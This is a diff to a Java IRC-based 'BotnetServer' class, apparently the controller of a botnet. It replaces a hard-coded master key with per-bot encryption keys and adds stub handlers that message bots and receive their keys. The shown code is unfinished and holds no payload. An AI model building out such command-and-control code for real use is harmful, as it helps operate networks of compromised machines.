@@ -75,21 +75,8 @@ public class BotnetServer extends PircBot {
 	private static final int TIMEOUT = 120000;
 	private Scanner input;
 	private boolean inChat;
-	
-	/*private static final byte[] key = 
-	{(byte)0x2e, (byte)0xa0, (byte)0x8c, (byte)0x66, (byte)0xf6, (byte)0x8d, (byte)0x71, 
-	(byte)0xae, (byte)0x83, (byte)0xa1, (byte)0x24, (byte)0x96, (byte)0xa3, (byte)0xc3, 
-	(byte)0xd0, (byte)0x91, (byte)0x7f, (byte)0x86, (byte)0x69, (byte)0x78, (byte)0x99, 
-	(byte)0xee, (byte)0x80, (byte)032, (byte)0x9d, (byte)0xb8, (byte)0xb1, (byte)0x47, 
-	(byte)0x65, (byte)0xa1, (byte)0xd0, (byte)0x01};*/
-
-	private static Key masterKey;
-	//private Cipher masterCipher;
-	
-	//private MsgEncrypt masterMsgE;
-	
-	private Map<String, Key> botInfo;
-	
+	private Map<String, MsgEncrypt> botKeys;
+		
 	public static void main(String[] args) {
 		BotnetServer bn = new BotnetServer();
 	}
@@ -100,7 +87,7 @@ public class BotnetServer extends PircBot {
 	public BotnetServer() {
 		input = new Scanner(System.in);
 		try {
-			botInfo = new HashMap<String, Key>();
+			botKeys = new HashMap<String, MsgEncrypt>();
 			//masterKey = MsgEncrypt.getStartKey();
 			//masterKey = new SecretKeySpec(key, "DESede");
 			//masterCipher = Cipher.getInstance("AES");
@@ -154,6 +141,8 @@ public class BotnetServer extends PircBot {
 	protected void onUserList(String channel, User[] bots) {
 		for (int i = 0; i < bots.length; i++) {
 			System.out.println("\t" + bots[i].toString());
+			//TODO: fill in stuff with key stuff
+			sendMessage(bots[i].getNick(), "stuff");
 		}
 		init();
 	}
@@ -164,6 +153,16 @@ public class BotnetServer extends PircBot {
 	
 	protected void onMessage(String channel, String sender, String login, String hostname, String message) {
 		System.out.println("<" + sender + ">: " + message);
+	}
+	
+	protected void onPrivateMessage(String sender, String login, String hostname, String message) {
+		
+		if (message.toLowerCase().startsWith("key")) {
+			String[] parts = message.split(" ", 2);
+			if (!botKeys.containsKey(sender) && parts.length > 1) {
+				//botKeys.put(sender, new MsgEncrypt(parts[1]);
+			}
+		}
 	}
 	
 	protected void onFileTransferFinished(DccFileTransfer transfer, Exception e) {
